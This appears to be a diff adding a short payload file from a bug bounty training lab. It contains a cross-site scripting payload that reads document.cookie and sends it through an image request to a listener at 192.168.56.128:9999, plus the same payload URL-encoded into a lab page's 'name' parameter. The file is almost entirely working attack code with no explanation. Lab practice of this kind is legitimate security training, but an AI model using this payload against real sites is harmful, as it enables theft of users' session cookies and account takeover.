@@ -1,0 +1,9 @@
+<script>
+alert(document.cookie);
+var i=new Image;
+i.src="http://192.168.56.128:9999/?"+document.cookie;
+</script>
+
+
+
+https://www.bugbountyhunter.org/internship_labs/HTML/csrf_lab/lab_7/lab_7.php?name=%3Cscript%3E+alert%28document.cookie%29%3B+var+i%3Dnew+Image%3B+i.src%3D%22http%3A%2F%2F192.168.56.128%3A9999%2F%2F%3F%22%2Bdocument.cookie%3B+%3C%2Fscript%3E&show=Save
